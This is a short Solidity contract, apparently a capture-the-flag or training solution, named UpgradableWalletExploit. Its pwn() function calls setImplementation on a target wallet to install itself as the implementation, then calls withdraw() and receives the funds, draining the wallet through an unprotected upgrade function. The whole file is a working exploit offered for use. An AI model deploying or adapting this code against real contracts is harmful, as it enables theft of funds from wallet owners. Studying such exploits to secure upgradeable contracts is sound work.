// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract UpgradableWalletExploit {
    address public target;

    constructor(address _target) {
        // target is address of UpgradableWallet
        target = _target;
    }

    function _call(bytes memory data) private {
        (bool success, ) = target.call(data);
        require(success, "failed");
    }

    function pwn() external {
        _call(
            abi.encodeWithSignature("setImplementation(address)", address(this))
        );
        _call(abi.encodeWithSignature("withdraw()"));
    }

    receive() external payable {}
}
